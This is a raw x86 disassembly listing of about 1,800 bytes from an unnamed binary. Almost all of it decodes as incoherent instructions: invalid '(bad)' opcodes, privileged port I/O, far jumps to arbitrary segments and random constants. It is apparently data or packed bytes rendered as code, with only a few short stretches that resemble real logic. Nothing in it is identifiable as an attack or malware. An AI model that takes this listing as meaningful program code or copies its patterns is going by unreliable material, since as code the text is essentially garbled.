  413eb6:	adc    edx,DWORD PTR [esp+ebx*2]
  413eb9:	outs   dx,DWORD PTR ds:[esi]
  413eba:	test   eax,0x603c4d40
  413ebf:	sbb    esi,DWORD PTR [eax+0x52]
  413ec2:	push   DWORD PTR ds:0xa9ec8447
  413ec8:	mov    ebx,0x4e896042
  413ecd:	pop    ecx
  413ece:	xchg   edi,eax
  413ecf:	xchg   esp,eax
  413ed0:	push   ebp
  413ed1:	fst    QWORD PTR [eax]
  413ed3:	pop    ebp
  413ed4:	sub    BYTE PTR [edi-0x162222cd],dl
  413eda:	scas   eax,DWORD PTR es:[edi]
  413edb:	add    eax,0xc0fb701d
  413ee0:	xchg   DWORD PTR [esi+0x76],ebx
  413ee3:	push   0x37433e00
  413ee8:	mov    eax,0xab088059
  413eed:	sbb    ax,0x23d2
  413ef1:	loop   0x413f45
  413ef3:	jl     0x413f4a
  413ef5:	loope  0x413eee
  413ef7:	cmp    dh,0xcc
  413efa:	dec    edi
  413efb:	jns    0x413ef2
  413efd:	jl     0x413f48
  413eff:	sbb    eax,0xbcdb2f8c
  413f04:	data16 sub al,0x4a
  413f07:	mov    esp,DWORD PTR [ecx-0x2c]
  413f0a:	or     BYTE PTR [ebp+0x410e5cdd],dh
  413f10:	jb     0x413ecd
  413f12:	jbe    0x413f5e
  413f14:	int3   
  413f15:	or     eax,0xdb124e14
  413f1a:	ja     0x413f83
  413f1c:	push   es
  413f1d:	rol    DWORD PTR [eax-0x74],1
  413f20:	jge    0x413ec2
  413f22:	xor    al,0x2c
  413f24:	sbb    al,0x46
  413f26:	gs sti 
  413f28:	fimul  WORD PTR [ecx+0x5091054b]
  413f2e:	fdivr  st(5),st
  413f30:	mov    ebp,0x60c79001
  413f35:	push   ebx
  413f36:	aas    
  413f37:	mov    edi,0x77812e78
  413f3c:	xor    BYTE PTR ds:0x9ad412be,dl
  413f42:	mov    ecx,0xf09a1c9f
  413f47:	outs   dx,DWORD PTR ds:[esi]
  413f48:	call   0x6d103139
  413f4d:	inc    eax
  413f4e:	call   0x96d0:0x3a884554
  413f55:	fld    QWORD PTR [esi-0x369fab9]
  413f5b:	pop    esi
  413f5c:	mov    esi,DWORD PTR [edi]
  413f5e:	fdivr  DWORD PTR [eax+0x2316cadf]
  413f64:	fistp  WORD PTR [edx-0x3279f2f8]
  413f6a:	and    ebx,DWORD PTR [edx+0x679ef650]
  413f70:	dec    DWORD PTR [edi-0x1a]
  413f73:	add    al,0x78
  413f75:	push   ds
  413f76:	sub    edx,0x56940c6e
  413f7c:	inc    ebp
  413f7d:	arpl   dx,cx
  413f7f:	xchg   DWORD PTR [ecx+ebp*1+0x49cb2947],ecx
  413f86:	pusha  
  413f87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f88:	shl    DWORD PTR [esi],0x80
  413f8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f8c:	xor    BYTE PTR [ebx],cl
  413f8e:	jecxz  0x414001
  413f90:	int3   
  413f91:	mov    edx,0x2f39153a
  413f96:	(bad)  
  413f97:	push   ss
  413f98:	int3   
  413f99:	jp     0x413ff5
  413f9b:	dec    esp
  413f9c:	sub    DWORD PTR [edx-0x42977df3],ecx
  413fa2:	xchg   ebp,eax
  413fa3:	mov    al,ds:0x6edcc03a
  413fa8:	loopne 0x413fc5
  413faa:	pop    es
  413fab:	xor    DWORD PTR [edi+0x31],esi
  413fae:	mov    bl,0x88
  413fb0:	cli    
  413fb1:	mov    al,ds:0xf5753d2f
  413fb6:	pop    es
  413fb7:	push   cs
  413fb8:	cwde   
  413fb9:	cwde   
  413fba:	sub    DWORD PTR [ebx+0x6bdff40a],edx
  413fc0:	xchg   edx,eax
  413fc1:	and    al,0x8a
  413fc3:	(bad)  
  413fc4:	test   al,0xfe
  413fc6:	out    dx,al
  413fc7:	hlt    
  413fc8:	jnp    0x413f7a
  413fca:	inc    ebp
  413fcb:	out    dx,eax
  413fcc:	push   es
  413fcd:	adc    al,0xcd
  413fcf:	xor    BYTE PTR [edi-0x276f5f8a],bl
  413fd5:	popa   
  413fd6:	or     DWORD PTR [edi-0x18cdf415],0xf
  413fdd:	stos   BYTE PTR es:[edi],al
  413fde:	jae    0x413f75
  413fe0:	les    esp,FWORD PTR [esi-0x2c]
  413fe3:	(bad)  
  413fe4:	cmp    eax,0x75aab383
  413fe9:	sti    
  413fea:	daa    
  413feb:	mov    ah,dl
  413fed:	stos   DWORD PTR es:[edi],eax
  413fee:	and    DWORD PTR [eax-0x4f8186a2],esi
  413ff4:	pop    edx
  413ff5:	lea    ecx,[ebp+0x3799dc47]
  413ffb:	adc    al,bh
  413ffd:	mov    cl,0x45
  413fff:	popf   
  414000:	test   al,0xd2
  414002:	jmp    0x9efc:0xc0421d66
  414009:	jmp    0x413ff3
  41400b:	sub    eax,0xd6801038
  414010:	sbb    eax,0x50500d4a
  414015:	jnp    0x413fbd
  414017:	xchg   ebp,eax
  414018:	mov    bl,0x42
  41401a:	cmp    esi,edx
  41401c:	sar    BYTE PTR [eax],0x59
  41401f:	jle    0x414064
  414021:	in     eax,dx
  414022:	and    cl,BYTE PTR [edx+0x658e0d34]
  414028:	sub    BYTE PTR [esi+0x7773a8ef],ch
  41402e:	addr16 jle 0x414060
  414031:	sub    dl,bh
  414033:	fst    DWORD PTR [ecx-0x13]
  414036:	adc    DWORD PTR ds:0xdf75d623,ebx
  41403c:	fwait
  41403d:	aam    0xf1
  41403f:	sar    DWORD PTR [ecx+ebx*1+0x4a],cl
  414043:	rcl    BYTE PTR [edx+0x62],1
  414046:	ins    DWORD PTR es:[edi],dx
  414047:	sub    BYTE PTR [ebp+0x21334b79],dl
  41404d:	adc    eax,ebp
  41404f:	jnp    0x414062
  414051:	mov    DWORD PTR [ebp+0x3392a1e],0x9597833d
  41405b:	retf   0x5509
  41405e:	div    dh
  414060:	lods   al,BYTE PTR ds:[esi]
  414061:	ret    
  414062:	pop    ebx
  414063:	xlat   BYTE PTR ds:[ebx]
  414064:	enter  0x349e,0xc9
  414068:	push   ebp
  414069:	inc    esi
  41406a:	mov    ch,0x2a
  41406c:	xor    al,0xf9
  41406e:	push   esi
  41406f:	clc    
  414070:	adc    bh,BYTE PTR [eax-0x1e]
  414073:	outs   dx,DWORD PTR ds:[esi]
  414074:	push   0xffffffc8
  414076:	hlt    
  414077:	shl    BYTE PTR [ebx+ecx*4+0x558b104d],1
  41407e:	adc    al,0x33
  414080:	rol    cl,cl
  414082:	loope  0x4140a2
  414084:	mov    ecx,DWORD PTR [ebp+0x10]
  414087:	xor    eax,esi
  414089:	or     eax,edx
  41408b:	mov    edx,DWORD PTR [ebp+0x14]
  41408e:	shrd   ecx,edx,0x2
  414092:	shr    edx,0x2
  414095:	mov    edx,DWORD PTR [ebp+0x10]
  414098:	mov    ebx,DWORD PTR [ebp+0x14]
  41409b:	xor    ecx,esi
  41409d:	xor    ebx,ebx
  41409f:	or     ecx,ebx
  4140a1:	shl    edx,0x1e
  4140a4:	jmp    0x4143dd
  4140a9:	pop    eax
  4140aa:	add    eax,0xb29872c6
  4140af:	jl     0x4140dc
  4140b1:	fisttp DWORD PTR [ecx+0x3bbba486]
  4140b7:	push   ss
  4140b8:	ror    DWORD PTR [ebx-0x6e],1
  4140bb:	mov    esi,0xbec4edbe
  4140c0:	mov    esi,0xdb2a815d
  4140c5:	and    al,0xcd
  4140c7:	lods   eax,DWORD PTR ds:[esi]
  4140c8:	bswap  ecx
  4140ca:	outs   dx,BYTE PTR ds:[esi]
  4140cb:	adc    dh,bl
  4140cd:	cmp    eax,0x45f132c9
  4140d2:	cwde   
  4140d3:	test   BYTE PTR [edx+eax*1-0x4fbbb918],al
  4140da:	and    al,0xaf
  4140dc:	fiadd  DWORD PTR [ebx-0x6153a0d7]
  4140e2:	imul   edi,DWORD PTR [edx-0x32],0x92e885e
  4140e9:	push   es
  4140ea:	std    
  4140eb:	cmp    BYTE PTR [ebp+edx*1-0x3d67731d],bl
  4140f2:	push   ds
  4140f3:	jge    0x4140c4
  4140f5:	jle    0x41409f
  4140f7:	add    ch,al
  4140f9:	bound  ecx,QWORD PTR [eax-0x2]
  4140fc:	repz mov bh,0x1e
  4140ff:	pop    edx
  414100:	jnp    0x4140ad
  414102:	ja     0x414135
  414104:	sub    DWORD PTR [edx+0x345a71fd],0xdf47b94d
  41410e:	cmp    edx,DWORD PTR [ebp+0x79e38386]
  414114:	sub    al,BYTE PTR [eax-0x55]
  414117:	loope  0x41411b
  414119:	cld    
  41411a:	xor    al,dl
  41411c:	cwde   
  41411d:	retf   
  41411e:	js     0x414140
  414120:	fsubr  QWORD PTR [edi+0x32006692]
  414126:	xchg   esi,eax
  414127:	je     0x414134
  414129:	aas    
  41412a:	pop    edi
  41412b:	and    DWORD PTR [ebx+0x48],ebx
  41412e:	mov    BYTE PTR [edi],ch
  414130:	sbb    BYTE PTR [esi+0x2fcce694],bh
  414136:	cdq    
  414137:	pop    ebx
  414138:	in     al,0xec
  41413a:	mov    ah,0x59
  41413c:	out    dx,eax
  41413d:	pushf  
  41413e:	mov    ebx,ss
  414140:	(bad)  
  414142:	xchg   ebx,eax
  414143:	in     al,0xb4
  414145:	call   0x472acec6
  41414a:	ins    BYTE PTR es:[edi],dx
  41414b:	shl    DWORD PTR [esi+esi*4],1
  41414e:	xor    cl,BYTE PTR [ebp+0x50]
  414151:	ds call 0x2692:0xeaddc63
  414159:	aam    0x7a
  41415b:	push   ss
  41415c:	fadd   DWORD PTR [ebx-0x6f]
  41415f:	dec    ecx
  414160:	pop    esi
  414161:	sahf   
  414162:	or     BYTE PTR [ebp-0x51],dh
  414165:	or     al,0xe5
  414167:	test   edi,0x27a06f07
  41416d:	retf   
  41416e:	jp     0x414150
  414170:	lahf   
  414171:	add    ah,0x57
  414174:	jge    0x414156
  414176:	xor    DWORD PTR [edx-0x12],0xf
  41417a:	into   
  41417b:	lea    ebx,[ecx+0xdeb9b63]
  414181:	lods   al,BYTE PTR ds:[esi]
  414182:	sub    DWORD PTR [ecx-0x59fa5edf],ecx
  414188:	iret   
  414189:	mov    dl,0x16
  41418b:	mov    dl,0xee
  41418d:	push   edi
  41418e:	xchg   ebx,eax
  41418f:	mov    bl,0xe6
  414191:	push   ss
  414192:	dec    ecx
  414193:	dec    dl
  414195:	add    BYTE PTR [ecx-0x51],al
  414198:	jnp    0x4141bf
  41419a:	and    BYTE PTR [ebx+0x6dea879f],0x98
  4141a1:	mov    eax,0xd4760c2f
  4141a6:	test   DWORD PTR [edi+0x74],eax
  4141a9:	fnstenv [ebx-0x27]
  4141ac:	inc    esp
  4141ad:	(bad)  
  4141ae:	cmp    DWORD PTR [ebx+0x2df52d43],ebp
  4141b4:	sub    DWORD PTR [edx+0x5f],edi
  4141b7:	lea    eax,[ecx]
  4141b9:	imul   ebp,DWORD PTR [ebx],0x6569d61d
  4141bf:	sbb    al,0xd6
  4141c1:	adc    cl,BYTE PTR [edi]
  4141c3:	icebp  
  4141c4:	(bad)  
  4141c5:	jae    0x414192
  4141c7:	out    0xe5,al
  4141c9:	push   esp
  4141ca:	fisubr WORD PTR ss:[eax+0x7]
  4141ce:	(bad)  
  4141cf:	fwait
  4141d0:	mov    ebx,0x9f90d341
  4141d5:	inc    edx
  4141d6:	mov    ebp,edi
  4141d8:	pop    edi
  4141d9:	loope  0x414227
  4141db:	add    esp,eax
  4141dd:	js     0x4141de
  4141df:	pop    ss
  4141e0:	nop
  4141e1:	mov    edi,0x60d9be7e
  4141e6:	retf   
  4141e7:	call   0xf7b8:0x93fe3e1
  4141ee:	cmp    DWORD PTR [ebp+0x54],ecx
  4141f1:	lods   eax,DWORD PTR ds:[esi]
  4141f2:	mov    ss,WORD PTR [ebp-0xe]
  4141f5:	xchg   BYTE PTR [edi+0x678cf03c],bl
  4141fb:	test   BYTE PTR [ecx-0x38a09d6b],bl
  414201:	mov    ch,0xa8
  414203:	das    
  414204:	ja     0x414240
  414206:	nop
  414207:	sub    edx,DWORD PTR [esi]
  414209:	inc    ebp
  41420a:	mov    edx,0x9f219cfb
  41420f:	adc    BYTE PTR [esi],bl
  414211:	stos   DWORD PTR es:[edi],eax
  414212:	or     eax,0xa6830094
  414217:	std    
  414218:	xlat   BYTE PTR ds:[ebx]
  414219:	ss out dx,al
  41421b:	cmp    bh,BYTE PTR [eax+0x27]
  41421e:	or     eax,0x7646bbd8
  414223:	xchg   BYTE PTR [ebp+0x58],bl
  414226:	ror    BYTE PTR [ebx],0xcb
  414229:	xchg   edi,eax
  41422a:	mov    ecx,0x758e15e8
  41422f:	pop    edx
  414230:	les    esi,FWORD PTR [eax+0x5a]
  414233:	loop   0x41420f
  414235:	add    cl,BYTE PTR [edi]
  414237:	cmp    al,0xae
  414239:	sar    BYTE PTR [edx+esi*2+0x687ce187],cl
  414240:	xchg   ebx,eax
  414241:	addr16 dec edx
  414243:	pop    es
  414244:	fsubr  st(6),st
  414246:	out    0x3f,al
  414248:	or     DWORD PTR [eax-0x13],edi
  41424b:	fcom   DWORD PTR [eax+0x1c]
  41424e:	push   0xffffffc6
  414250:	sub    eax,0x60f105f2
  414255:	or     ebp,edx
  414257:	cmp    dl,dh
  414259:	xor    BYTE PTR [ebx-0x1ca87a87],ch
  41425f:	xchg   ch,dl
  414261:	dec    edx
  414262:	and    ah,ah
  414264:	lods   eax,DWORD PTR ds:[esi]
  414265:	scas   al,BYTE PTR es:[edi]
  414266:	push   ss
  414267:	neg    BYTE PTR [edx]
  414269:	and    BYTE PTR es:[ebx+esi*1-0x5b],ah
  41426e:	js     0x41426c
  414270:	cs mov eax,0xd42fca6e
  414276:	adc    edx,edx
  414278:	fbstp  TBYTE PTR [edi+edi*8-0x7c]
  41427c:	mov    ebp,0x98ce8104
  414281:	inc    edx
  414282:	gs jl  0x41429d
  414285:	ins    DWORD PTR es:[edi],dx
  414286:	in     al,dx
  414287:	inc    ebp
  414288:	add    al,0x46
  41428a:	stos   DWORD PTR es:[edi],eax
  41428b:	leave  
  41428c:	fild   WORD PTR [ebx+0x1ac85d4e]
  414292:	pop    esi
  414293:	sub    eax,0x1155cf2c
  414298:	mov    dl,0x45
  41429a:	sti    
  41429b:	jns    0x41427d
  41429d:	loope  0x41425c
  41429f:	inc    ebp
  4142a0:	mov    esp,0xf58c8670
  4142a5:	ins    DWORD PTR es:[edi],dx
  4142a6:	sbb    BYTE PTR [edx+ebp*4+0x61],0x18
  4142ab:	or     eax,0x6b2a28a7
  4142b0:	in     al,dx
  4142b1:	pop    es
  4142b2:	adc    eax,0x1f39a82a
  4142b7:	test   BYTE PTR [edx+0x13],0x25
  4142bb:	push   ebx
  4142bc:	adc    dh,dl
  4142be:	pop    edi
  4142bf:	mov    edx,0xc4d252bc
  4142c4:	mov    edi,0x65ccd858
  4142c9:	jae    0x414337
  4142cb:	pop    ds
  4142cc:	ds jno 0x414279
  4142cf:	mov    dh,0x6c
  4142d1:	sar    ebp,0x93
  4142d4:	and    al,0x85
  4142d6:	fimul  WORD PTR [eax]
  4142d8:	(bad)  
  4142d9:	nop
  4142da:	pop    esp
  4142db:	xchg   DWORD PTR [edi-0x7da0dba6],ebx
  4142e1:	jno    0x4142a7
  4142e3:	mov    eax,0xdf40f83e
  4142e8:	pop    es
  4142e9:	jge    0x414326
  4142eb:	stos   BYTE PTR es:[edi],al
  4142ec:	sub    eax,0x3427b958
  4142f1:	cli    
  4142f2:	xchg   esp,eax
  4142f3:	mov    ds:0xeed33a4b,eax
  4142f8:	stos   BYTE PTR es:[edi],al
  4142f9:	loopne 0x4142a3
  4142fb:	inc    eax
  4142fc:	xor    al,0x7d
  4142fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142ff:	fdiv   QWORD PTR [edi-0x1d899a5d]
  414305:	xchg   edx,eax
  414306:	jl     0x41435e
  414308:	lea    ecx,[esi]
  41430a:	loop   0x414362
  41430c:	and    DWORD PTR [eax-0x36f082cd],0x68
  414313:	inc    ebp
  414314:	loopne 0x414318
  414316:	cmp    al,0xb0
  414318:	(bad)  
  414319:	xchg   edi,eax
  41431a:	pop    edi
  41431b:	jnp    0x414344
  41431d:	or     esp,0x501f3042
  414323:	mov    ah,0x68
  414325:	mov    esp,0xea3320e
  41432a:	cmp    cl,bl
  41432c:	dec    esp
  41432d:	mov    ds:0xb5893db8,al
  414332:	push   edi
  414333:	add    BYTE PTR [ebx-0x40],bl
  414336:	jl     0x414383
  414338:	out    0x62,al
  41433a:	mov    ch,0x8e
  41433c:	pop    esp
  41433d:	std    
  41433e:	in     eax,dx
  41433f:	and    DWORD PTR [esi+0x6802acfa],edi
  414345:	jae    0x41439b
  414347:	xchg   ecx,eax
  414348:	xchg   DWORD PTR [edi+ecx*2-0x3d],esi
  41434c:	icebp  
  41434d:	cmp    dh,BYTE PTR [edi-0x56]
  414350:	mov    bl,0x56
  414352:	mov    ds:0x5057756f,al
  414357:	or     al,0x4e
  414359:	adc    al,0xbc
  41435b:	in     al,0xd4
  41435d:	adc    ecx,0x2b
  414360:	popf   
  414361:	mov    ch,0x53
  414363:	jae    0x4143ab
  414365:	leave  
  414366:	sar    BYTE PTR ds:0xbd8d9eff,1
  41436c:	into   
  41436d:	mov    esi,0xa679c744
  414372:	mov    ecx,DWORD PTR [ebx]
  414374:	movntq QWORD PTR [eax+0x3c7e0ffd],mm0
  41437b:	fmul   QWORD PTR [ebp+0x3f2a5a96]
  414381:	push   eax
  414382:	cwde   
  414383:	imul   DWORD PTR [esi-0x26]
  414386:	xchg   DWORD PTR [ebx],edx
  414388:	ins    BYTE PTR es:[edi],dx
  414389:	out    0x88,eax
  41438b:	outs   dx,DWORD PTR ds:[esi]
  41438c:	ficom  WORD PTR [ecx+0x4dd2fa6a]
  414392:	adc    al,0xf9
  414394:	jne    0x4143d8
  414396:	enter  0xbd8e,0xd8
  41439a:	lds    ebp,FWORD PTR [ebp-0x6e3f4626]
  4143a0:	jo     0x41433c
  4143a2:	daa    
  4143a3:	adc    eax,0xaefcf5a6
  4143a8:	out    0xd8,al
  4143aa:	lock shr esp,cl
  4143ad:	cmp    dl,dh
  4143af:	inc    eax
  4143b0:	mov    esi,0xfde86698
  4143b5:	jge    0x414341
  4143b7:	test   DWORD PTR [edi-0x4c],ecx
  4143ba:	hlt    
  4143bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143bc:	and    eax,0xe60f0481
  4143c1:	push   ds
  4143c2:	out    dx,eax
  4143c3:	stos   BYTE PTR es:[edi],al
  4143c4:	(bad)  
  4143c6:	(bad)  
  4143c7:	rol    BYTE PTR [esi-0x7b],cl
  4143ca:	cmp    ch,cl
  4143cc:	adc    DWORD PTR [ebx+esi*2],esi
  4143cf:	jle    0x4143b8
  4143d1:	popa   
  4143d2:	push   cs
  4143d3:	rol    BYTE PTR [ecx],0xcd
  4143d6:	or     al,cl
  4143d8:	sti    
  4143d9:	pop    ebp
  4143da:	cwde   
  4143db:	arpl   WORD PTR [bp+di],ax
  4143de:	ror    DWORD PTR [ebx+0x558b104d],0x14
  4143e5:	shrd   ecx,edx,0x2
  4143e9:	shr    edx,0x2
  4143ec:	xor    ecx,esi
  4143ee:	jmp    0x414727
  4143f3:	cmp    eax,0xb8c710f5
  4143f8:	sub    BYTE PTR [ebp+0x76acc878],dl
  4143fe:	xchg   edx,eax
  4143ff:	push   es
  414400:	push   ebp
  414401:	mov    ss,WORD PTR [eax-0x41416785]
  414407:	in     eax,dx
  414408:	les    edi,FWORD PTR [esi+0xc1837be]
  41440e:	ret    0xfe83
  414411:	mov    DWORD PTR [edi],esp
  414413:	push   edx
  414414:	sub    eax,0x6d1133d2
  414419:	pushf  
  41441a:	push   cs
  41441b:	je     0x414405
  41441d:	sub    al,BYTE PTR [ebp+0x4254f684]
  414423:	pop    ss
  414424:	out    0x3c,al
  414426:	mov    ds:0xb1955882,eax
  41442b:	inc    esp
  41442c:	test   eax,0x6ece9629
  414431:	inc    ecx
  414432:	fcomp  QWORD PTR [ecx-0x782e559]
  414438:	das    
  414439:	jmp    0xce5ade1a
  41443e:	cmp    al,0xb6
  414440:	mov    bh,0x14
  414442:	jl     0x4143e0
  414444:	jbe    0x41441e
  414446:	imul   edx,DWORD PTR ds:0x4ae6e286,0x4f
  41444d:	(bad)
  414450:	cmp    ebp,DWORD PTR [ecx-0x14]
  414453:	ds jp  0x4144b2
  414456:	jmp    0x4144d7
  414458:	js     0x414448
  41445a:	out    dx,al
  41445b:	mov    esp,0x2b4f1533
  414460:	xor    BYTE PTR ds:0x4ae77a6e,ah
  414466:	xchg   esi,eax
  414467:	aad    0x2a
  414469:	pop    ds
  41446a:	(bad)  
  41446c:	xchg   ecx,eax
  41446d:	mov    bl,0xdb
  41446f:	push   0x5f
  414471:	pop    ds
  414472:	jae    0x4144b0
  414474:	loope  0x41444d
  414476:	sahf   
  414477:	leave  
  414478:	push   eax
  414479:	adc    esp,ebp
  41447b:	and    al,0xcb
  41447d:	into   
  41447e:	add    esp,esi
  414480:	xor    DWORD PTR [esi+0x18],ecx
  414483:	sub    bh,BYTE PTR [ebx+ebp*1+0x234a5e3b]
  41448a:	adc    edi,DWORD PTR [ebp+0x3a6603bc]
  414490:	js     0x4144fb
  414492:	cmp    al,0x72
  414494:	rol    BYTE PTR [esi],0xef
  414497:	dec    esp
  414498:	sub    al,0xd6
  41449a:	je     0x414458
  41449c:	loop   0x4144b8
  41449e:	pop    edi
  41449f:	lahf   
  4144a0:	sar    DWORD PTR [edx],0x10
  4144a3:	(bad)  
  4144a4:	xlat   BYTE PTR ds:[ebx]
  4144a5:	es int 0x44
  4144a8:	cmp    dh,BYTE PTR [edi+0x65]
  4144ab:	push   eax
  4144ac:	fwait
  4144ad:	xchg   ecx,eax
  4144ae:	mov    eax,ds:0xe896f4a7
  4144b3:	cmp    DWORD PTR [edi-0x3b],ebx
  4144b6:	and    eax,ecx
  4144b8:	jbe    0x4144fa
  4144ba:	cdq    
  4144bb:	xor    al,0x15
  4144bd:	inc    edx
  4144be:	push   ss
  4144bf:	mov    ebp,0xf19e1a8c
  4144c4:	aas    
  4144c5:	push   es
  4144c6:	(bad)  
  4144c7:	cmp    BYTE PTR [edi],bl
  4144c9:	and    dh,dl
  4144cb:	pop    edi
  4144cc:	push   ds
  4144cd:	jge    0x414450
  4144cf:	gs push edx
  4144d1:	xchg   edx,eax
  4144d2:	int    0xb6
  4144d4:	mov    ds:0x56813018,eax
  4144d9:	test   al,0x46
  4144db:	xchg   ecx,eax
  4144dc:	fcom   DWORD PTR [esi+ecx*1+0x492c663a]
  4144e3:	retf   
  4144e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144e5:	mov    edi,0xc033c60
  4144ea:	or     dl,dh
  4144ec:	mov    ds:0x8313586b,al
  4144f1:	mov    edi,DWORD PTR [esi]
  4144f3:	sbb    al,0x8f
  4144f5:	mov    bh,0x3f
  4144f7:	(bad)  
  4144f8:	jge    0x4144db
  4144fa:	cld    
  4144fb:	cmp    BYTE PTR [eax-0x254d51ef],dl
  414501:	dec    edx
  414502:	or     DWORD PTR [eax+0x43],esp
  414505:	add    BYTE PTR [esi+0x765c1c4a],al
  41450b:	mov    cl,0x80
  41450d:	push   esi
  41450e:	stc    
  41450f:	rcl    BYTE PTR [ebp+0x4d],cl
  414512:	int3   
  414513:	cwde   
  414514:	call   0x6b53:0xbb181004
  41451b:	and    eax,0xea79e6be
  414520:	int3   
  414521:	pushf  
  414522:	aam    0xfa
  414524:	mov    DWORD PTR [bp-0x49],edi
  414528:	in     eax,dx
  414529:	pop    ss
  41452a:	xor    BYTE PTR [edi+0x25620d11],bh
  414530:	dec    ebx
  414531:	adc    al,ch
  414533:	jbe    0x4144e3
  414535:	call   0xa8c9:0x679dd689
  41453c:	shl    BYTE PTR ds:0x28ca94c1,0xfb
  414543:	sub    BYTE PTR [esp+ecx*8+0x4bb08d88],0x36
  41454b:	mov    eax,0xb6300d88
  414550:	cli    
  414551:	jb     0x4144fb
  414553:	or     eax,0xa25ff8e9
  414558:	(bad)  
  414559:	clc    
  41455a:	arpl   WORD PTR [ebx],dx
  41455c:	test   BYTE PTR fs:[edx-0x42],bl
  414560:	maxps  xmm2,XMMWORD PTR [ebp-0x99fc781]
  414567:	jle    0x414595
  414569:	stc    
  41456a:	jno    0x4144f9
  41456c:	cld    
  41456d:	aaa    
  41456e:	jmp    0xb081673c
  414573:	fild   DWORD PTR [eax+0x5e]
  414576:	and    DWORD PTR [eiz*4+0x68c69c54],esp
  41457d:	cmp    ch,dh
  41457f:	or     eax,0xe481a553
  414584:	setle  dh
  414587:	aad    0x25
  414589:	mov    eax,ds:0x4780f7f
  41458e:	push   esi
  41458f:	push   esi
  414590:	fwait
  414591:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414592:	call   0x81465474
  414597:	mov    ds:0xb294801d,eax
  41459c:	fnstenv [ecx]
  41459e:	pop    edi
  41459f:	adc    DWORD PTR [ecx-0x13],0xf799be9e
  4145a6:	mov    edx,0xa3a6dcda
  4145ab:	clc    
  4145ac:	leave  
  4145ad:	loopne 0x414590
  4145af:	mov    cl,0x2f
  4145b1:	jae    0x414602
  4145b3:	in     al,0xcf
  4145b5:	dec    edx
  4145b6:	icebp  
  4145b7:	fnstsw WORD PTR [edx-0x9a002f3]
  4145bd:	fiadd  DWORD PTR [ebx+0x62]
  4145c0:	pushf  
  4145c1:	pop    edi
  4145c2:	cmp    ebp,ecx
  4145c4:	jne    0x414562
  4145c6:	loop   0x41460f
  4145c8:	in     eax,dx
  4145c9:	push   es
  4145ca:	and    eax,0x4290886c
  4145cf:	lock adc al,0xd2
  4145d2:	clc    
  4145d3:	mov    bl,0xab
  4145d5:	or     DWORD PTR [ebx-0x30],esp
  4145d8:	adc    DWORD PTR ds:0x856a413a,edi
  4145de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145df:	inc    edx
  4145e0:	adc    DWORD PTR [edx+0x64],ebx
  4145e3:	mov    BYTE PTR [ecx+0x7d],0x5a
  4145e7:	outs   dx,BYTE PTR ds:[esi]
  4145e8:	push   ecx
  4145e9:	ds mov dh,0x3
  4145ec:	gs xchg esp,eax
  4145ee:	and    BYTE PTR [edi],al
  4145f0:	xchg   esi,eax
  4145f1:	sub    ah,dl
  4145f3:	inc    ebp
  4145f4:	ret    0x83e3
  4145f7:	or     al,0x61
  4145f9:	inc    ebp
  4145fa:	jmp    0x414628
  4145fc:	mov    ds:0x9869b379,al
  414601:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414602:	dec    edx
  414603:	gs pusha 
  414605:	add    dl,BYTE PTR [ebx-0x133bdeba]
  41460b:	ins    DWORD PTR es:[edi],dx
  41460c:	and    bl,BYTE PTR [eax-0x27]
  41460f:	in     al,dx
  414610:	fadd   QWORD PTR [esi+0x1438380]
  414616:	aam    0x80
  414618:	daa    
  414619:	and    eax,DWORD PTR [edi]
  41461b:	fidiv  WORD PTR [ecx+ebx*4+0x2a]
  41461f:	imul   ebx,DWORD PTR [edx],0xffffff94
  414622:	xchg   esi,eax
  414623:	push   edi
  414624:	xchg   BYTE PTR [eax+ebx*4+0x40],al
  414628:	in     al,0x77
  41462a:	mov    WORD PTR [edi-0x5f277bd],ds
  414630:	dec    eax
  414631:	jmp    0x60226238
  414636:	inc    edx
  414637:	jecxz  0x4145f6
  414639:	bound  esi,QWORD PTR [eax-0x34]
  41463c:	jp     0x4145ce
  41463e:	add    DWORD PTR [eax-0x27],eax
  414641:	mov    eax,0x4fcdc3d8
  414646:	mov    eax,0xc09d7138
  41464b:	in     eax,dx
  41464c:	xchg   ebp,eax
  41464d:	loope  0x414611
  41464f:	or     dl,BYTE PTR [ecx+0x6d]
  414652:	xor    edx,eax
  414654:	das    
  414655:	es das 
  414657:	add    al,BYTE PTR [edi]
  414659:	cmp    al,0x3c
  41465b:	pop    edx
  41465c:	jne    0x414684
  41465e:	pop    ds
  41465f:	outs   dx,BYTE PTR ds:[esi]
  414660:	loop   0x414635
  414662:	cli    
  414663:	jmp    0x58eb:0x3292552c
  41466a:	adc    esp,DWORD PTR [edx-0x36]
  41466d:	mov    eax,0xa5d03a7c
  414672:	dec    ecx
  414673:	test   BYTE PTR [ecx+ecx*1-0x7ab1829d],dh
  41467a:	es xchg BYTE PTR es:[esi],dl
  41467e:	into   
  41467f:	call   0xc57c:0x2f48ca3a
  414686:	push   edx
  414687:	mov    ebx,0xf6faf3f5
  41468c:	fcomip st,st(4)
  41468e:	(bad)  
  41468f:	pop    eax
  414690:	pushf  
  414691:	sbb    eax,0x99abe008
  414696:	mov    ecx,DWORD PTR [eax+0x63]
  414699:	mov    bl,0x73
  41469b:	shl    al,0x61
  41469e:	pop    edi
  41469f:	int    0xdb
  4146a1:	(bad)
  4146a4:	xor    DWORD PTR [edi+ebp*8],ecx
  4146a7:	push   edi
  4146a8:	aad    0x90
  4146aa:	pushf  
  4146ab:	nop
  4146ac:	mov    edi,ebx
  4146ae:	enter  0x98f1,0x50
  4146b2:	pop    edi
  4146b3:	cli    
  4146b4:	std    
  4146b5:	mov    BYTE PTR [esp+ebp*2],ch
  4146b8:	clc    
  4146b9:	out    0xcb,eax
  4146bb:	test   edx,eax
  4146bd:	lods   eax,DWORD PTR ds:[esi]
  4146be:	jl     0x414722
  4146c0:	dec    ecx
  4146c1:	and    eax,0x19fc7b4d
  4146c6:	pop    ebp
  4146c7:	jl     0x41467c
  4146c9:	into   
  4146ca:	mov    ecx,0x6f340948
  4146cf:	mov    edi,0x4c9ae894
  4146d4:	mov    esp,0x5047ab3d
  4146d9:	sbb    eax,0x9713166f
  4146de:	nop
  4146df:	sbb    eax,0xc18e659f
